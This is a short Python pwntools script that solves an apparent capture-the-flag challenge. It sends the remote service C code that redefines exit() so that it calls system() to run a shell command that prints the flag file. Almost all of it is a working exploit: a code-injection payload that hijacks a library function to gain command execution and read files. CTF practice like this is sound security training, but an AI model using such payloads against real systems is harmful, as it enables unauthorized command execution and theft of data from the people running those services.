#!/usr/bin/env python3
from pwn import *
import re

HOST = "from-russia-with-love.aws.jerseyctf.com"
PORT = 9001

# Penting: payload dibuat one-line agar tidak terpotong loop fgets pada service.
PAYLOAD_C = (
    '#include <unistd.h>\n'
    '#include <stdlib.h>\n'
    'void exit(int status){system("/bin/sh -c \'cat /chal/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null\'");_exit(0);}\n'
)

def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"make sure it's not too big!\n")
    io.send(PAYLOAD_C.encode())

    data = io.recvall(timeout=8)
    text = data.decode(errors="ignore")
    print(text)

    m = re.search(r"jctf\{[^\n\r}]*\}", text)
    if m:
        print(f"\n[+] FLAG: {m.group(0)}")
    else:
        print("\n[-] Flag belum ketemu di output")

if __name__ == "__main__":
    main()
